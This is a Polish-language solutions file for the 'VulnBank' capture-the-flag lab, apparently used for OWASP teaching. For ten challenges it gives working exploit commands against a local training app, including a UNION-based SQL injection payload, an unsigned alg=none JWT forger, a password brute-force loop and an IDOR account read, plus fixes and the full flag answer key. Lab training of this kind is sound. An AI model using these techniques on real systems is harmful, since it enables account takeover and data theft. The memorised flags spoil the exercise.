# VulnBank — Rozwiązania (Write-upy)

## UWAGA: Ten plik zawiera pełne spoilery

---

## Przygotowanie — konto w portalu CTF

Przed submitowaniem flag musisz mieć konto w portalu CTF (osobne od kont bankowych).

```bash
# Zarejestruj gracza
curl -X POST http://localhost:5000/api/ctf/auth/register \
  -H "Content-Type: application/json" \
  -d '{"nickname":"h4x0r","email":"gracz@example.com","password":"haslo123"}'

# Lub jeśli masz już konto — zaloguj się
CTF_TOKEN=$(curl -s -X POST http://localhost:5000/api/ctf/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"gracz@example.com","password":"haslo123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

Submit flagi używa CTF tokenu (`$CTF_TOKEN`), nie bankowego:

```bash
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{...}"}'
```

---

## A01 — Broken Access Control (IDOR)
**Flaga:** `PWR{idor_account_takeover}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
`GET /api/accounts/<id>` nie weryfikuje czy konto należy do zalogowanego użytkownika.

### Exploit

```bash
# 1. Zaloguj się do banku jako bob
BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. IDOR: zmień ID na 1 (konto alice)
curl -H "Authorization: Bearer $BANK_TOKEN" http://localhost:5000/api/accounts/1
# W odpowiedzi: "internal_note": "PWR{idor_account_takeover}"

# 3. Submit w portalu CTF
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{idor_account_takeover}"}'
```

### Naprawa
```python
account = Account.query.get_or_404(account_id)
if account.user_id != int(get_jwt_identity()):
    return jsonify({"error": "Brak dostępu"}), 403
```

---

## A02 — Security Misconfiguration
**Flaga:** `PWR{debug_config_exposed}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Endpoint `/api/debug/config` dostępny bez autoryzacji zwraca `os.environ()`.

### Exploit

```bash
curl http://localhost:5000/api/debug/config | python3 -m json.tool | grep FLAG
# "FLAG_A02": "PWR{debug_config_exposed}"

# Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{debug_config_exposed}"}'
```

### Naprawa
Usuń endpoint przed wdrożeniem lub zabezpiecz `@jwt_required()` + `require_admin()`.

---

## A03 — Supply Chain Failures
**Flaga:** `PWR{vulnerable_dependency_found}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
PyYAML 5.3.1 w `requirements.txt` — CVE-2020-14343. Endpoint `/api/debug/dependencies` ujawnia listę pakietów z CVE.

### Exploit

```bash
curl http://localhost:5000/api/debug/dependencies \
  | python3 -c "
import sys, json
for p in json.load(sys.stdin)['packages']:
    if 'flag' in p:
        print(p['flag'])
"
# PWR{vulnerable_dependency_found}
```

### Naprawa
Zaktualizuj PyYAML do `>=6.0.0`. Dodaj `pip-audit` do CI/CD.

---

## A04 — Cryptographic Failures (MD5)
**Flaga:** `PWR{md5_no_salt_cracked}`  
**Trudność:** medium | **Punkty:** 150

### Podatność
Hasła hashowane MD5 bez soli. Endpoint `/api/admin/backup` zwraca hashe.

### Exploit

```bash
# 1. Zdobądź admin token przez A08 (patrz niżej)
# 2. Pobierz backup
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:5000/api/admin/backup \
  | python3 -c "
import sys, json
for u in json.load(sys.stdin):
    if u['email'] == 'charlie@vulnbank.pl':
        print(u['password_hash'])
"
# Hash: 5e201833a6a6462cc668004937b4f857

# 3. Wklej na crackstation.net → charlie2024

# 4. Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{md5_no_salt_cracked}"}'
```

### Naprawa
Użyj `bcrypt` lub `argon2` zamiast MD5.

---

## A05 — SQL Injection
**Flaga:** `PWR{sqli_transactions_leaked}`  
**Trudność:** medium | **Punkty:** 150

### Podatność
`GET /api/transactions/search?q=` — string concatenation w SQL.

### Exploit

```bash
BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# UNION SELECT — wyciągnij flagę z tabeli flags
PAYLOAD="' UNION SELECT id,flag_value,to_account_id,amount,title,created_at FROM flags WHERE challenge_id='A05'--"

curl -G "http://localhost:5000/api/transactions/search" \
  -H "Authorization: Bearer $BANK_TOKEN" \
  --data-urlencode "q=$PAYLOAD"
# W odpowiedzi: "from_account_id": "PWR{sqli_transactions_leaked}"
```

### Naprawa
```python
result = db.session.execute(
    db.text("SELECT ... WHERE title LIKE :q"),
    {"q": f"%{q}%"}
)
```

---

## A06 — Insecure Design (Password Reset)
**Flaga:** `PWR{insecure_password_reset}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Reset hasła wymaga tylko PESELU. PESEL widoczny przez IDOR (A01).

### Exploit

```bash
# PESEL alice w seeds: 90010112345

# 1. Zresetuj hasło alice znając jej PESEL
curl -X POST http://localhost:5000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@vulnbank.pl","pesel":"90010112345","new_password":"hacked123"}'

# 2. Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{insecure_password_reset}"}'
```

### Naprawa
Użyj bezpiecznych tokenów wysyłanych na email z czasem wygaśnięcia.

---

## A07 — Authentication Failures (Brute-force)
**Flaga:** `PWR{no_ratelimit_bruteforce}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Brak rate-limitingu na `/api/auth/login`.

### Exploit (curl + bash)

```bash
PASSWORDS=("123456" "password" "12345678" "qwerty" "abc123" "monkey" "letmein" "dragon" "master" "password123")

for PASS in "${PASSWORDS[@]}"; do
  RESULT=$(curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"$PASS\"}")
  if echo "$RESULT" | grep -q '"token"'; then
    echo "HASŁO: $PASS"
    break
  fi
done
# HASŁO: password123
```

### Exploit (Burp Suite Intruder)
1. Przechwycić POST /api/auth/login
2. Intruder → Sniper, zaznacz `password`
3. Payload: rockyou.txt top 100
4. Filtruj po statusie 200

### Submit

```bash
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{no_ratelimit_bruteforce}"}'
```

### Naprawa
```python
@limiter.limit("5 per minute")
def login():
    ...
```

---

## A08 — JWT None Algorithm Bypass
**Flaga:** `PWR{jwt_tampered_admin}`  
**Trudność:** medium | **Punkty:** 150

### Podatność
Backend akceptuje JWT z `alg=none` — token bez podpisu.

### Exploit (Python)

```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "2", "is_admin": True, "email": "bob@vulnbank.pl", "iat": 9999999999}

def b64url(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

token = f"{b64url(header)}.{b64url(payload)}."
print(token)
```

```bash
# Wyślij token do panelu admina
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/admin/dashboard
# Odpowiedź zawiera flagę

# Submit przez portal CTF
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{jwt_tampered_admin}"}'
```

### Naprawa
```python
app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"]
```

---

## A09 — Logging & Alerting Failures
**Flaga:** `PWR{logs_exposed_no_auth}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
`GET /api/admin/logs` dostępny bez autoryzacji. Logi zawierają hasła plaintext.

### Exploit

```bash
curl http://localhost:5000/api/admin/logs | python3 -m json.tool | grep PWR
# "2024-01-15 08:23:11 ERROR Login failed for admin@vulnbank.pl with password PWR{logs_exposed_no_auth}"

# Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{logs_exposed_no_auth}"}'
```

### Naprawa
```python
@admin_bp.route("/logs")
@jwt_required()
def get_logs():
    err = require_admin()
    if err: return err
    # NIE loguj haseł:
    logger.warning(f"Failed login for {email}")  # bez password!
```

---

## A10 — Exceptional Conditions (Stack Trace)
**Flaga:** `PWR{stacktrace_db_url_leaked}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Flask `DEBUG=True` + brak obsługi wyjątku → stack trace Werkzeug z zmiennymi lokalnymi.

### Exploit

```bash
# Wywołaj ValueError przez błędny parametr
curl "http://localhost:5000/api/loans/calculate?amount=abc&rate=2" | grep -o "PWR{[^}]*}"
# PWR{stacktrace_db_url_leaked}

# Lub w przeglądarce:
# http://localhost:5000/api/loans/calculate?amount=abc&rate=2
# → interaktywny debugger Werkzeug z zmienną db_url

# Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{stacktrace_db_url_leaked}"}'
```

Zmienna `db_url` w stack trace:
```
postgresql://vulnbank:PWR{stacktrace_db_url_leaked}@db/vulnbank
```

### Naprawa
```python
try:
    amount = float(request.args.get("amount"))
except ValueError:
    return jsonify({"error": "Nieprawidłowy parametr"}), 400
# + FLASK_DEBUG=false w produkcji
```

---

## Łączny wynik

| # | Flaga | Pkt |
|---|-------|-----|
| A01 | PWR{idor_account_takeover} | 100 |
| A02 | PWR{debug_config_exposed} | 100 |
| A03 | PWR{vulnerable_dependency_found} | 100 |
| A04 | PWR{md5_no_salt_cracked} | 150 |
| A05 | PWR{sqli_transactions_leaked} | 150 |
| A06 | PWR{insecure_password_reset} | 100 |
| A07 | PWR{no_ratelimit_bruteforce} | 100 |
| A08 | PWR{jwt_tampered_admin} | 150 |
| A09 | PWR{logs_exposed_no_auth} | 100 |
| A10 | PWR{stacktrace_db_url_leaked} | 100 |
| **Suma** | | **1150** |
